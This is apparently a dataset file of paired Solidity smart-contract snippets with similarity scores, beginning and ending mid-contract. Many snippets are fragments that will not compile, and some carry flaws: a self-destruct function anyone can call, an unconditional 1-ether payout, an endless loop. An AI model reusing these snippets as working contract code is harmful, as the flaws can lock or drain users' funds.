    mapping(uint256 => RequestsIndex) public requestsIDsIndex;



    

    uint[] queue;



    function addRequest(uint id, address addr, uint256 amount) public onlyBy(owner) returns (bool success) {

		if (isEntity(id)) {

			return false;

		}



		queue.push(id);



		requestsIDsIndex[id] = RequestsIndex({

			addr: addr,

			amount: amount,

			hash: 0,

			isEntity: true

		});

		emit requestAdded(id, addr, amount);

        return true;

    }



    function getQueueSize() public view returns (uint size) {

        return queue.length;

    }



    function getAddrById(uint _id) public view returns (address _addr){

        return requestsIDsIndex[_id].addr;

    }



    function getRequestById(uint256 _id) public view returns(address addr, uint256 amount, bytes32 hash) {

        RequestsIndex memory a = requestsIDsIndex[_id];

        return (a.addr, a.amount, a.hash);

    }



    function isEntity(uint _id) public view returns (bool isIndeed) {

        return requestsIDsIndex[_id].isEntity;

    }

    

    function closeRequest(uint _id, bytes32 _hash) public onlyBy(owner) {

        requestsIDsIndex[_id].hash = _hash;

        ArrayUtil.RemoveByValue(queue, _id);

		emit requestUpdated(_id, requestsIDsIndex[_id].addr, _hash);

    }

}"
"contract ContractONE {    
       uint public i;
       function register(uint _i) payable{
          if(msg.value > 1 ether){
             i = _i;
          } else {revert();}
        }
       ...
    }",0.581828335271202,"contract PureLoop
{
    function execute() public pure returns (uint output) {
        uint num;
        while(true) {
            num++;
        }
        return num;
    }
}"
"contract Dispatcher{
  address _implementation;
  function() public{
    bytes4 sig;
    assembly { sig := calldataload(0) }
    var len = _returnSizes[sig];
    var target = _implementation;

    assembly {
    
        calldatacopy(0x0, 0x0, calldatasize)
        let ret := delegatecall(sub(gas, 10000), target, 0x0, calldatasize, 0, len)
        jumpi(0xffffffff, iszero(ret))
        return(0, len)
    }
}",0.5266586831594616,"contract Lock {
    
    
    constructor (address owner, uint256 unlockTime) public payable {
        assembly {
            sstore(0x00, owner)
            sstore(0x01, unlockTime)
        }
    }
    
    
    function () external payable { 
        assembly {
            switch gt(timestamp, sload(0x01))
            case 0 { revert(0, 0) }
            case 1 {
                switch call(gas, sload(0x00), balance(address), 0, 0, 0, 0)
                case 0 { revert(0, 0) }
            }
        }
    }
}"
"contract NPA {

    struct NPADat {
        uint id;
        string bankName;
        string borrowName;
        string asset;
        string sector;
        string date;
        int Auction_id;
    }
    NPADat [] public npa;
    uint public nextId;

   function create(string memory bankName, string memory bname, string memory asset, string memory sector,  string memory Date, int auctionId  ) public{
        npa.push(NPADat(nextId, bankName, bname, asset, sector, Date, auctionId));
        nextId++;
    }

    function readId(uint id) view public returns(uint, string memory, string memory, string memory, string memory, string memory, int){
        for(uint i=0; i<npa.length; i++){
            if(npa[i].id==id){
                return(npa[i].id, npa[i].bankName, npa[i].borrowName, npa[i].asset, npa[i].sector, npa[i].date, npa[i].Auction_id);
            }
        }
    }       
}",0.5584832675453115,"contract ZSMNToken is ERC20 {

    string private _name;
	
    string private _symbol;
	
    uint8 private _decimals;
	
	uint256 private _totalSupply;
	
	constructor(string memory name, string memory symbol, uint8 decimals, uint256 initialSupply, address tokenOwnerAddress) public payable {
      _name = name;
      _symbol = symbol;
      _decimals = decimals;
      _totalSupply = initialSupply * 10 ** uint256(decimals);
      
      _mint(tokenOwnerAddress, _totalSupply);

    }
    

    
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }


   
    

    
    function name() public view returns (string memory) {
      return _name;
    }

    
    function symbol() public view returns (string memory) {
      return _symbol;
    }

    
    function decimals() public view returns (uint8) {
      return _decimals;
    }
}"
"contract MyContract
{
    function MyContract()
    {

    }

    function MyContract_function() public
    {
        MyLibrary_1.TestFunction();
        MyLibrary_2.TestFunction();
    }

    function() 
    {
        throw;
    }
}",0.5183715312685365,"contract TestReentryProtection is ReentryProtection {

    
    function test() external noReentry {
        reenter();
    }

    function reenter() public noReentry {
        
    }

}"
"contract Project
{
    struct Person {
        address addr;
        uint funds;
    }

    Person[] people;

    function getPeople(uint[] indexes)
        public
        returns (address[], uint[])
    {
        address[] memory addrs = new address[](indexes.length);
        uint[]    memory funds = new uint[](indexes.length);

        for (uint i = 0; i < indexes.length; i++) {
            Person storage person = people[indexes[i]];
            addrs[i] = person.addr;
            funds[i] = person.funds;
        }

        return (addrs, funds);
    }
}",0.5881383753152704,"contract EtherDelta {

  function deposit() public payable {}

  function withdrawToken(address token, uint amount) public {}

  function trade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s, uint amount) public {}

  function balanceOf(address token, address user) public view returns (uint);

}"
"contract B{
   function rep() public returns(string memory){

      return string(C(0x8fcECc5B8d42EcF099E1cF032B1F505fbDA230A3).name());
   }
   }",0.555519684615573,"contract TP {
  function TonyPepperoni() external pure returns (string memory) {
    return ""Bag of Donuts"";
  }
}"
"contract contractA
{
  
  function foo() external
  {
     
     contractB.transfer(1 ether);
  }
  
}",0.5979874815389756,"contract PotAbstract {
    function drip() external returns (uint256);
}"
"contract PePaDe {
  event NewShipment(address shipment);

  function createShipment(address _recipient, string _originAddress,
      string _destAddress, int _maxTemp, int _minTemp,
      uint _weightInKg, uint _expirationTime) public  {
    Shipment shipment = new Shipment(msg.sender, _recipient,
       _originAddress, _destAddress, _maxTemp, _minTemp,
       _weightInKg, _expirationTime);
    NewShipment(shipment);
  }
}",0.5221595471338562,"contract Certifier {
	event Confirmed(address indexed who);
	event Revoked(address indexed who);
	function certified(address) public constant returns (bool);
	function get(address, string) public constant returns (bytes32);
	function getAddress(address, string) public constant returns (address);
	function getUint(address, string) public constant returns (uint);
}"
"contract Calculator{
    int result;
    function Calculator(int initialResult){
       result=initialResult;
    }
}",0.5688435735391246,"contract IPayoutCalculator {
    function calculatePayout(bytes32 _info, uint _duration) returns (uint);
}"
"contract SimpleAuction{
    event HiggestBidIncreased(address binder,uint amount);
    function bid()payable{
        HiggestBidIncreased(msg.sender,msg.value);
    }
}",0.5647859688882141,"contract ProxyTest {



    event ETHSent(uint amt);



    function sendETH() public payable {

        address(msg.sender).transfer(msg.value);

        emit ETHSent(msg.value);

    }



}"
"contract Origin {

struct OriginInfo
{
    string airportName;
    uint32 checkInTime; 
    uint8 bagWeight;
    address clientAddress;
    bool itsHere;
}

function insertOrigin(string _airportName, uint32 _checkInTime, uint8 _bagWeight, bool _itsHere) external
{
    


    OriginInfo(_airportName, _checkInTime, _bagWeight, msg.sender, true);
    getOrigin();
}

function getOrigin() private constant returns (string, uint32, uint8, address, bool) 
{
    return (OriginInfo.airportName, 
    OriginInfo.checkInTime, 
    OriginInfo.bagWeight, 
    OriginInfo.clientAddress, 
    OriginInfo.itsHere);
}
}",0.5340054337359609,"contract freedomStatement {

    

    string public statement = ""https:

    mapping (address => bool) internal consent;

    event wearehere(string statement);

    

    constructor () public {

        emit wearehere(statement);

    }

        

    function isHuman(address addr) internal view returns (bool) {

        uint size;

        assembly { size := extcodesize(addr) }

        return size == 0;

    }



    function () external payable {

        require(isHuman(msg.sender),""no robot"");

        require(msg.value< 0.0000001 ether);

        consent[msg.sender] = true;

    }

    

    function check(address addr) public view returns (bool){

        return(consent[addr]);

    }

}"
"contract Court {
  mapping(address => Data) subcourts;
}",0.5871916630364921,"contract WhiteListed{

    mapping(address => bool)whitelist;

}"
"contract Client{
    Server public s  = new Server();
    function doit(){
        s.homicide();
        throw;
    }
}",0.5951090330824481,"contract Lottery

{

    event Bid(address sender);



    function bid() public

    {

        emit Bid(msg.sender);

    }

}"
"contract Server{ 
    bool public alive = true;
    function homicide(){
        Suicide();
        suicide(msg.sender);

    }
    event Suicide();
}",0.5581980237641387,"contract NGTToken {
    function transfer(address _recipient, uint256 _value) public returns (bool success);
}"
"contract PresaleCrowdsale is AllowanceCrowdsale {
  constructor(
    uint256 _rate,
    address payable _wallet,
    ERC20 _token,
    address _tokenWallet
  )
    Crowdsale(_rate, _wallet, _token)
    AllowanceCrowdsale(_tokenWallet)
    public
  {}
}",0.5832086210285322,"contract MintedCrowdsale is Crowdsale {

    constructor() internal {}



    

    function _deliverTokens(

        address beneficiary,

        uint256 tokenAmount

    )

    internal

    {

        

        require(

            ERC20Mintable(address(token())).mint(beneficiary, tokenAmount));

    }

}"
"contract ArrayHouse { 
  House[] public arrayHouse;

  function getHouse(uint n) returns(House){
    if (n >= arrayHouse.length) 
      throw;
    return arrayHouse[n];
  }
}",0.5563435461654777,"contract ContractReceiver {

    function tokenFallback(address _from, uint _value) public pure returns(address) {

       if (_value != 0) return _from;

    }

}"
"contract BaseConstituency is Ownable {
    uint numVotes;
    uint constituencyType;
    string constituencyName;

    struct Candidate {
        string name;
        uint numVotes;
        bool validCandidate;
    }

    struct Voter {
        bool hasVoted;
        bool validVote;
        uint candidateVote;
    }

    Candidate[] candidates;

    constructor(uint _constituencyType, string _constituencyName) public{
        numVotes = 0;
        constituencyType = _constituencyType;
        constituencyName = _constituencyName;
    }

    function getStuff() public view returns(uint, string){
        return (constituencyType, constituencyName);
    }

}",0.5229287156900588,"contract freedomStatement {

    

    string public statement = ""https:

    mapping (address => bool) internal consent;

    event wearehere(string statement);

    

    constructor () public {

        emit wearehere(statement);

    }

        

    function isHuman(address addr) internal view returns (bool) {

        uint size;

        assembly { size := extcodesize(addr) }

        return size == 0;

    }



    function () external payable {

        require(isHuman(msg.sender),""no robot"");

        require(msg.value< 0.0000001 ether);

        consent[msg.sender] = true;

    }

    

    function check(address addr) public view returns (bool){

        return(consent[addr]);

    }

}"
"contractoronlyowner
{

}",0.5341857662994681,contract OneLiner {}
"contract TestLibrary{
    using IntExtended for uint;

    function testIncrement(uint _base) returns (uint){
        return IntExtended.increment(_base);
}

    function testDecrement(uint _base) returns (uint){
        return IntExtended.decrement(_base);
}

    function testIncrementByValue(uint _base,uint _value) returns(uint){
        return _base.incrementByValue(_value);
} 

    function testDecrementByValue(uint _base, uint _value) returns (uint){
        return _base.decrementByValue(_value);
}
}",0.5653667937467252,"contract IToken { 

    
    function totalSupply() constant returns (uint);


    
    function balanceOf(address _owner) constant returns (uint);


    
    function transfer(address _to, uint _value) returns (bool);


    
    function transferFrom(address _from, address _to, uint _value) returns (bool);


    
    function approve(address _spender, uint _value) returns (bool);


    
    function allowance(address _owner, address _spender) constant returns (uint);
}"
"contract A{
   bytes public fname=""Yerevan"";
   function naming() public returns(string memory){

      return C(0x8fcECc5B8d42EcF099E1cF032B1F505fbDA230A3).rep(fname);
  }
  }",0.5548550848907268,"contract AssetIDInterface {

  function getAssetID() public constant returns (string);

  function getAssetIDHash() public constant returns (bytes32);

}"
"contract Election {
    
    struct Candidate{
        uint id;
        string name;
        uint voteCount;
    }
    
    
    mapping(uint=>Candidate)public candidates;
    
    uint public candidateCount;
    function election()public{
        addCandidate(""Donald Trump"");
        addCandidate(""Barak Obama"");
    }

    function addCandidate(string memory _name)private{
        candidateCount++;
        candidates[candidateCount] = Candidate(candidateCount,_name,0);
    }
}",0.5028579831111366,"contract PricingStrategy2 {

    using SafeMath for uint;

    uint public rate;

    function PricingStrategy2(uint _rate) {
        require(_rate > 0);
        rate = _rate;
    }

    
    function isPricingStrategy() public constant returns (bool) {
        return true;
    }

    
    function calculateTokenAmount(uint weiAmount) public constant returns (uint tokenAmount) {
        return weiAmount.mul(rate);
    }
}"
"contract UpgraderToken is TestMigrationTarget {
 function UpgraderToken(address _oldToken)
    TestMigrationTarget(_oldToken) {
}
}",0.5375918900402434,"contract MigrationTarget is
    IMigrationTarget
{
    
    
    

    
    modifier onlyMigrationSource() {
        require(msg.sender == currentMigrationSource());
        _;
    }
}"
"contract AddOrRemoveAdminVotingBuilder
{
    function build(
        address pPlatform,
        address pAdminManager
    )
        external
        returns(address)
    {
        return address(
            new AddOrRemoveAdminVoting(
                pPlatform, 
                pAdminManager
            )
        );
    }
}",0.5499461324417917,"contract locaToken {

    function transferFrom(address _from, address _to, uint _value) public returns (bool);

    function allowance(address _owner, address _spender) public view returns (uint);

}"
"contract Test is TestBase{
    string[] name ;

    constructor() public payable {
      name.push(""sheep"");
      name.push(""fox"");
      name.push(""whale"");
    }

    function getNames() public returns(string[] memory){
        emit Log(""Test"",address(this),msg.sender,tx.origin);
        display();
        return name;
    }
}",0.5949504324192466,"contract HelpMe is LandBase {

    string public constant name = ""HelpMe"";

    string public constant symbol = ""Help"";



    function implementsERC721() public pure returns (bool)

    {

        return true;

    }



    function() public payable{

        revert();

    }

}"
"contract TestBase2 {
    event Log(string context,address,address,address);

    function display2() public returns(address){
        emit Log(""TestBase2"",address(this),msg.sender,tx.origin);
        return msg.sender;
    }

}",0.5601380328279295,"contract tme    {
    function parentAddress(address possibleParent) public returns(bool);
    function returnChildAddressForParent(address parentAddressOfChild) public returns(address);
}"
"contract TestBase is TestBase2{

    function display() public returns(address){
        emit Log(""TestBase"",address(this),msg.sender,tx.origin);
        display2();
        TestBase3 t = new TestBase3();
        t.display();
        return msg.sender;
    }
}",0.527235288668908,"contract Context {
    constructor () public { }

    function _msgSender() public view returns (address) {
        return msg.sender;
    }

    function _msgData() public view returns (bytes memory) {
        this;
        return msg.data;
    }
}"
"contract TestBase3 {
    event Log(string context,address,address,address);

    function display() public returns(address){
        emit Log(""TestBase3"",address(this),msg.sender,tx.origin);

        return msg.sender;
    }
}",0.562890636757655,"contract tme    {
    function parentAddress(address possibleParent) public returns(bool);
    function returnChildAddressForParent(address parentAddressOfChild) public returns(address);
}"
"contract EtherBandBattlesManager is Pausable {

using SafeMath for uint256;    

    function testPayment(address _payeeAddr)
            payable
            public
            onlyOwner
            {
        require(_payeeAddr != address(0), ""(testPayment) The payee address is not set."");
        require(msg.value != 0, ""(testPayment) The amount of value accompanying the transaction is zero."");

        
        _payeeAddr.transfer(msg.value);
    }
}",0.5959907356165417,"contract Withdrawable is Ownable {
    
    function withdrawEther(address _to, uint _value) onlyOwner public returns(bool) {
        require(_to != address(0));
        require(address(this).balance >= _value);

        _to.transfer(_value);

        return true;
    }

    
    function withdrawTokens(ERC20 _token, address _to, uint _value) onlyOwner public returns(bool) {
        require(_to != address(0));

        return _token.transfer(_to, _value);
    }
}"
"contract Upload{

    mapping(address => bool) managerAddresses;
    string public ownerName;
    string public location;

    modifier restricted(){
        require(managerAddresses[msg.sender]);
        _;
    }


    constructor(address[] _managerAddressesArr,string _ownerName,string _location)  public {
        for(uint i = 0;i<_managerAddressesArr.length;i++){
            managerAddresses[_managerAddressesArr[i]] = true;
        }
        ownerName = _ownerName;
    }

    function setLocation(string _location) restricted public{
        location = _location;
    }



}",0.5892787811888697,"contract SimpleVoting {



    string public constant description = ""abc"";



    string public name = ""asd"";



    mapping (string => string) certificates;



    address owner;



    constructor() public {

        owner = msg.sender;

    }



    function getCertificate(string memory id) public view returns (string memory) {

        return certificates[id];

    }



    function setCertificate(string memory id, string memory cert) public {

        require(msg.sender == owner);

        certificates[id] = cert;

    }

}"
"contract test {

struct document{
   string ipfsHash;
   string documentName;
   bytes32 accessKey;
}

struct grantAccess{
   address owner;
   address single;     
}",0.5248194941853069,"contract AbstractRegistration {
    
    function getRegistration() public view returns(string, address, string, string, uint, string, string, address[5], uint[5]);
}"
"contract ERC165 {

         function interfaceID() constant returns (uint)
         {
            bytes4[] sigs = type(this).signatures;
            uint mask = 0;
            for (var i = 0; i < sigs.length; i++)
            mask ^= uint(sigs[i]);
        return mask;
    }
}",0.5945941996699242,"contract MassSend is ERC20Interface{

    function masssend( address[] recipients, uint256[] values) public {

        for (uint256 i = 0; i < recipients.length; i++) {

            transfer(recipients[i], values[i]);

        }

    }

}"
"contract Set {
    bool public ret;
    address public tokenAddr;
    address public userAddr;
    function Set(address tokenAddr_,address userAddr_){
        tokenAddr=tokenAddr_;
        userAddr=userAddr_;
    } 
    function call1(byte bb){
        ret=tokenAddr.call(""notify"",bb,userAddr);   
    }
    function call2(byte bb){
        tokenAddr.call(bytes4(sha3(""notify(byte,address)"")),bb,userAddr);
    }
    function call3(byte bb){
        NotifyContract c=NotifyContract(tokenAddr);
        c.notify(bb,userAddr);
    }
}",0.5693856042238222,"contract TokenOwnable is Ownable {
    address private _tokenAddress;

  
    constructor(address tokenAddress) public Ownable() {
        _tokenAddress = tokenAddress;
    }

    
    function tokenAddress() public view returns (address) {
        return _tokenAddress;
    }

    
    modifier onlyToken() {
        require(isToken(), ""TokenOwnable: caller is not the token"");
        _;
    }

     
    function isToken() public view returns (bool) {
        return _msgSender() == _tokenAddress;
    }

}"
"contract Board
{
    string  foo;
    event Shout();
    event TextEvent(
        string  indexed text,
        uint timestamp
    );

    function shout(string _text)
    {
        foo=_text;
        Shout();
        TextEvent(_text,now);
    }

    function getFoo() returns(string){
        return foo;
    } 
}",0.5893461816247443,"contract InfoContract {
    
   string fName;
   uint age;
   
   function setInfo(string _fName, uint _age) public {
       fName = _fName;
       age = _age;
   }
   
   function getInfo() public constant returns (string, uint) {
       return (fName, age);
   }   
}"
"contract Project
{
    struct Person {
        address addr;
        uint funds;
    }
    
    Person[] people;
    
    function getPeople(uint[] indexes)
        public
        view
        returns (address[], uint[])
    {
        address[] memory addrs = new address[](indexes.length);
        uint[]    memory funds = new uint[](indexes.length);
        
        for (uint i = 0; i < indexes.length; i++) {
            Person storage person = people[indexes[i]];
            addrs[i] = person.addr;
            funds[i] = person.funds;
        }
        
        return (addrs, funds);
    }
}",0.5988095473690304,"contract InstaBalRead is Helpers {
    function getTokensBalData(address owner, address[] memory tknAddress) public view returns (uint[] memory) {
        uint[] memory tokensBal = new uint[](tknAddress.length);
        for (uint i = 0; i < tknAddress.length; i++) {
            if (tknAddress[i] == getAddressETH()) {
                tokensBal[i] = owner.balance;
            } else {
                TokenInterface token = TokenInterface(tknAddress[i]);
                tokensBal[i] = token.balanceOf(owner);
            }
        }
        return tokensBal;
    }
}"
"contract Storage
{
    mapping(address => string[]) dataOfAddr;
    function writeData(address _addr, string _data, uint8 v, bytes32 r, bytes32 s) payable public returns(uint)
    {
        require(ecrecover(sha256(_data), v, r, s) == _addr);
        dataOfAddr[_addr].push(_data);
        msg.sender.transfer(1 ether); 
        return dataOfAddr[_addr].length;
    }
}",0.5807418282206006,"contract ERC667 is ERC20 {
    constructor(string _name, string _symbol)
        public
        ERC20(_name, _symbol)
    {}

    function transferAndCall(address _to, uint _value, bytes _data)
        public
        returns (bool success)
    {
        require(super.transfer(_to, _value));
        require(HasTokenFallback(_to).tokenFallback(msg.sender, _value, _data));
        return true;
    }
}"
"contract MyContract
{
    struct something {
        bytes32 test1;
        bytes32 test2;
        bytes32 test3;
    }

    mapping (address => Something[]) public stuff;
}",0.5466885328597152,"contract EOSContractInterface

{

    mapping (address => string) public keys;

    function balanceOf( address who ) constant returns (uint value);

}"
"contract Test 
{
    uint x = 0;
    uint y = 8;

    function calculate() 
    {
        uint z = x+y;
    }
}",0.5728524292958381,"contract Calculator {
    function getAmount(uint value) constant returns (uint);
}"
"contract A{

address public seller; 


function A(){
    seller = 0xdd870fa1b7c4700f2bd7f44238821c26f7392148;
 }

function transfer_from_B(address b){

 seller.transfer(b.balance);
}
}",0.5836014855987436,"contract ERC20_Transferable {
    function balanceOf(address addr) public returns(uint);
    function transfer(address to, uint value) public returns (bool);
}"
"contract itemlistcallercontract {
     ItemListContract itemlistcontract;
     function itemlistcallercontract()
     {
     itemlistcontract = ItemListContract(""0x16c5d0c8fccaf7e5824f5ae25c1662877cec6452"");
     }

     function getitemcount() constant returns(int count)
     {
     return itemlistcontract.countItemList();
     }
}",0.5157876862746885,"contract Bakery {



  



  address[] public contracts;



  



  function getContractCount()

    public

    constant

    returns(uint contractCount)

  {

    return contracts.length;

  }



  



  function newCookie()

    public

    returns(address newContract)

  {

    Cookie c = new Cookie();

    contracts.push(c);

    return c;

  }

}"
"contract test {
    event LogEvent(
        address a,
        bool result
    );    

    function testInputs(some parameters) public (){

        ....

        
        bool[2] a = [true,true]; 

        
        

        if(a[1] && a[2])
            LogEvent(msg.sender,true);
        else
            LogEvent(msg.sender,false);
    }  
}",0.5540545733469247,"contract IPausable{
    event Paused(address account);
    event Unpaused(address account);

    function paused() public view returns (bool);

    function _pause() internal;
    function _unpause() internal;
}"
"contract SampleContract
{
    function fromHexChar(uint c) public pure returns(uint)
    {
        if(byte(c) >= byte('0') && byte(c) <= byte('9')) 
        {
            return c - uint(byte('0'));
        }
        if(byte(c) >= byte('a') && byte(c) <= byte('f'))
        {
            return 10 + c - uint(byte('a'));
        }
        if(byte(c) >= byte('A') && byte(c) <= byte('F'))
        {
            return 10 + c - uint(byte('A'));
        }
    }

    function fromHex(string memory s) public pure returns(bytes) 
    {
        bytes memory ss = bytes(s);
        require(ss.length%2 == 0);

        bytes memory r = new bytes(ss.length/2);
        for(uint i=0; i<ss.length/2; ++i)
        {
            r[i] = byte(fromHexChar(uint(ss[2*i]))*16 +         
            fromHexChar(uint(ss[2*i+1])));
        }
        return r;
    }
}",0.5698016334593244,"contract DSPauseAbstract {
    function setOwner(address) public;
    
    function setAuthority(address) public;
    function setDelay(uint256) public;
    
    function plans(bytes32) public view returns (bool);
    
    function proxy() public view returns (address);
    
    function delay() public view returns (uint256);
    function plot(address, bytes32, bytes memory, uint256) public;
    function drop(address, bytes32, bytes memory, uint256) public;
    function exec(address, bytes32, bytes memory, uint256) public returns (bytes memory);
}"
"contract DappToken{


uint256 public totalSupply;

constructor DappToken() public{
    totalSupply = 10000;    

 }

}",0.5950838711748806,"contract Token {

	uint8 public decimals;



  	constructor (uint8 _decimals) public {

		decimals = _decimals;

  	}

}"
"contract ContractFactory{
    ChildContract[] public createdContracts;
    ChildContract public activeChild;

    function createChild() public{
        ChildContract newChild = new ChildContract();
        createdContracts.push(newChild);
        
            activeChild.activate(false);
        
        activeChild = newChild;
    }
}",0.5567451139254583,"contract Bakery {



  



  address[] public contracts;



  



  function getContractCount()

    public

    constant

    returns(uint contractCount)

  {

    return contracts.length;

  }



  



  function newCookie()

    public

    returns(address newContract)

  {

    Cookie c = new Cookie();

    contracts.push(c);

    return c;

  }

}"
"contract DepositCounter {
    uint deposits = 0;
    function() {
        deposits++;
    }
}",0.5956612089027512,"contract token { function transfer(address receiver, uint amount){  } }"
"contract OtherTest
{
    ITest private test;

    constructor(
        address testAddress
    )
        public
    {
        test = ITest(testAddress);
        test.check();
    }
}",0.5611188368190427,"contract InstaKyber is Trade {



    constructor(address rAddr) public {

        addressRegistry = rAddr;

    }



    function () public payable {}



}"
"contract Master {
  bool public isActive=false;
  uint public num=0;

  function changeState() returns bool newState{
    isActive = !isActive;
    newState = isActive;
  }

  function increaseSubjectCount(subjectAddr) returns uint newCount{
    SubjectContract subjectContract = SubjectContract(subjectAddr);
    newCount = ubjectAddr.increaseCount();
  }
}",0.5876307300899373,"contract Restricted is Ownable {
    bool private isActive = true;    
    
    modifier contractIsActive() {
        require(isActive);
        _;
    }

    function pauseContract() public onlyOwner {
        isActive = false;
    }

    function activateContract() public onlyOwner {
        isActive = true;
    }

    function withdrawContract() public onlyOwner {        
        msg.sender.transfer(address(this).balance);
    }
}"
"contract VenueRegistry{
    struct Queue{
        uint head;
        uint tail;
        mapping(uint => address) queue;
    }

    struct Venue{
        uint id;
        Queue queue;
    }

    mapping (uint => Venue) venues;

    function getVenue(uint _index) public view returns(Venue memory){
        return venues[_index];
    }
}",0.5849695548569488,"contract ERC20Basic {

    uint public totalSupply;

    function balanceOf(address who) public view returns (uint);

    function transfer(address to, uint value) public returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);

}"
"contract eXample {

  function eXample{
   .....
  }

  event MyEvent(uint x,uint y,uint z);
  function doSomething{
    .....

   MyEvent(x,y,z);
  }
}",0.5413726824902182,"contract EtherToken is Token {

    
    function deposit()
        public
        payable
    {}

    
    
    function withdraw(uint amount)
        public
    {}
}"
"contract contractCaller {
  ....

  eXample instance = eXample(address)
 
  function exampleFunction{
    instance.doSomething
  }
  
  ....
}",0.5325910801904549,"contract MarketingAddress {

    function() external payable {

        revert(""The contract don`t receive ether"");

    } 

}"
"contract InsuranceClaim{
    struct Request {
        address payable insuranceRecipient;
        string personName;
        uint value;
        address payable hospitalRecipient;
        bool complete;

    }
    Request[] public requests;
    address public claimer;

    constructor (address creator) public{
        claimer = creator;
    }

    modifier restricted(){
        require(msg.sender==claimer);
        _;
    }

    function createRequest(string memory personName,address payable insuranceRecipient,uint value,address payable hospitalRecipient) public restricted{
        Request memory newRequest = Request({
            insuranceRecipient:insuranceRecipient,
            value:value,
            personName:personName,
            hospitalRecipient:hospitalRecipient,
            complete:false
        });
        requests.push(newRequest);
    }

    function finalizeRequest (uint index) public payable restricted{
        Request storage request = requests[index];
        require(!request.complete);
        request.hospitalRecipient.transfer(request.value);
        request.complete = true;
    }
}",0.5584072215895505,"contract MultiSigTransfer is Ownable {

  string public name = ""MultiSigTransfer"";

  string public symbol = ""MST"";

  bool public complete = false;

  bool public denied = false;

  uint32 public quantity;

  address public targetAddress;

  address public requesterAddress;



  

  constructor(

    uint32 _quantity,

    address _targetAddress,

    address _requesterAddress

  ) public {

    quantity = _quantity;

    targetAddress = _targetAddress;

    requesterAddress = _requesterAddress;

  }



  

  function approveTransfer() public onlyOwner {

    require(denied == false, ""cannot approve a denied transfer"");

    require(complete == false, ""cannot approve a complete transfer"");

    complete = true;

  }



  

  function denyTransfer() public onlyOwner {

    require(denied == false, ""cannot deny a transfer that is already denied"");

    denied = true;

  }



  

  function isPending() public view returns (bool) {

    return !complete;

  }

}"
"contract ZombieFeeding is ZombieFactory {

KittyInterface kittyContract;

}",0.5091183924720721,"contract KittyCoreInterface {

    function cooAddress() public returns(address);

}"
"contract Marketplace {

 using SafeMath for uint;

    struct User {
        uint reputation;
        string name;
        bool isUser;
    }

    struct Request {
            address company;
            uint id;
            uint deadline; 
            uint startTime;
            uint miniReputation;
            uint remuneration;
            string description;
            string url;
            State state;
            mapping(address=>bool) accepted;
            mapping(address=>bool) candidates;
    }

    address owner;
    mapping (address => uint) public balances;
    mapping(address => User) public users;
    mapping(uint => Request) public requests;
   


    uint requestCount;
    uint decimal=100;
    uint cost=102;

    enum State{OPENED,ONGOING,CLOSED}

    event UserCreated(address _add,uint _reputation, string  _name, bool _isUser);
    event RequestCreated(address _add, uint _id, uint _deadline, uint _startTime,
    uint _miniReputation, uint _cost, string _description,
    string _url, State _state);
    event Application(uint _id,address _add,uint _reputation);
    event OfferAccepted(uint _id,address _add);

    constructor() public{
        owner = msg.sender;
        requestCount;
    }

   modifier requestState 
        (uint _id, State _state)
        {
            require(requests[_id].state==_state,""request is not accessible"");
            _;
        }

    modifier nextRequestState
        (uint _id, State _state)
        {
            updateState(_id, _state);
         _;

        }

    modifier isUser
        (address _add)
        {
            require(_add!=address(0),""You are the 0 address"");
            require(users[_add].isUser,""You are not a user !"");
            _;
        }

    modifier isRequest
        (uint _id)
        {
            require(requests[_id].id > 0,""The request does not exist !"");
            _;
        }


    modifier isCandidate
        (uint _id,address _add)
        {
            require(_add!=address(0),""You are the 0 address"");
            require(requests[_id].candidates[_add],""You are not a candidate !"");
            _;
        }


    modifier isCompany
        (uint _id)
        {
            require(msg.sender!=address(0),""You are the 0 address"");
            require(requests[_id].company!=msg.sender,""You are the company !"");
            _;
        }

    modifier isAccepted
        (uint _id,address _add)
        {
            require(_add!=address(0),""You are the 0 address"");
            require(requests[_id].accepted[_add],""You are not accepted !"");
            _;
        }

    modifier isInTime
    (uint _id)
    {
      require(requests[_id].startTime<=now && requests[_id].deadline>=now,""You are not in time"");  
      _;
    }

    modifier afterDeadline
    (uint _id)
    {
        require(requests[_id].deadline < now,""The deadline is not reached !"");
        _;
    }

    function  updateState(uint _id,State _state) internal{
        requests[_id].state = _state;
    }


    function inscription (string memory _name, uint _reputation) 
    public 
    {
        require(!users[msg.sender].isUser, ""You are already user !"");
        require(bytes(_name).length>0,""the name is not valid"");
        require(_reputation>=1,""the reputation is not valid"");
        User memory newUser = User(_reputation,_name,true);
        users[msg.sender] = newUser;
        emit UserCreated(msg.sender,_reputation,_name,true);
    }

    
    function addRequest
    (string calldata _description,
    uint _miniReputation,
    uint _deadline,
    uint _remuneration)
    external
    payable
    isUser(msg.sender)
    {
        
        require(bytes(_description).length>0,""The description is not valid !"");
        
        require(_miniReputation>1,""miniReputation is not valid"");
        
        require(_deadline>0,""The deadline is not valid"");
        
        uint _amount = (_remuneration.mul(cost)).div(decimal);
        require(msg.value >= _amount,""not enough of Wei"");
        requestCount++;
        balances [owner]=balances [owner].add(msg.value);
       uint deadline = _deadline * 1 days;
       Request memory newRequest = Request(msg.sender,requestCount,deadline,0,_miniReputation,_remuneration,_description,"""",State.OPENED);
       requests[requestCount] = newRequest;
       emit RequestCreated(msg.sender,requestCount,deadline,0,requests[requestCount].miniReputation,requests[requestCount].remuneration,requests[requestCount].description,"""",State.OPENED);
    }




    function applyTo(uint _id)
    public
    isUser(msg.sender)
    isCompany(_id)
    isRequest(_id)
    requestState(_id,State.OPENED)
    {

        require(!requests[_id].candidates[msg.sender],""You are already candidate !"");
        require(requests[_id].miniReputation<=users[msg.sender].reputation,""Reputation is not enought"");
        requests[_id].candidates[msg.sender]=true;
        emit Application(_id,msg.sender,users[msg.sender].reputation);
    }



    function acceptOffer(uint _id,address _add)
    public
    isRequest(_id)
    requestState (_id,State.OPENED)
    isCandidate(_id,_add)
    nextRequestState(_id,State.ONGOING)
    {
        require(requests[_id].company==msg.sender,""You are not the company !"");
        requests[_id].startTime = now;
        requests[_id].deadline=requests[_id].deadline+requests[_id].startTime;
        requests[_id].accepted[_add] =true;   
         emit OfferAccepted(_id,_add);
    }



    function delivery(uint _id,string memory _url)
    public
    isAccepted(_id,msg.sender)
    isRequest(_id)
    requestState (_id,State.ONGOING)
    isInTime(_id)
    nextRequestState(_id,State.CLOSED)
    {
        requests[_id].url = _url;
        users[msg.sender].reputation++;
        uint remuneration = requests[_id].remuneration;
       
